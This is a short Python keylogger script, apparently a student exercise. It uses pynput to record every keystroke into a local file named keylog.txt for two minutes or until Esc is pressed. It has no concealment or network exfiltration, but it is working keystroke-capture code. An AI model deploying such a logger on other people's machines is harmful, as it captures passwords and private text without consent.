#Geetika Joshi
#2019h1030124h


from pynput.keyboard import Key,Listener
import os.path
import time
word = ""
Fileopen = False
f = None
def check_time():
    global end_time
    if time.time() >= end_time:
        # f.close()
        return False
    else:
        return True
def stop():
    global word,f
    logging(word)
    f.close()


def logging(log):
    global Fileopen,f
    if Fileopen:
            f.write(log)
    else:
        f = open('keylog.txt','w')
        f.write(log)
        Fileopen = True
            
def on_press(key):
    global word
    if key == Key.space:
      
        logging(word+" ")
        word = ""
    elif key == Key.enter:
        logging(word+'\n')
        word =""
        
    else: 
       
       word=word+str(key).replace("'","")
    
def on_release(key):
    global word
    if check_time() is False:
        stop()
        return False

    if key == Key.esc:
        logging(word+'\n')
        f.close()
        return False

end_time = time.time() + 120
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
 
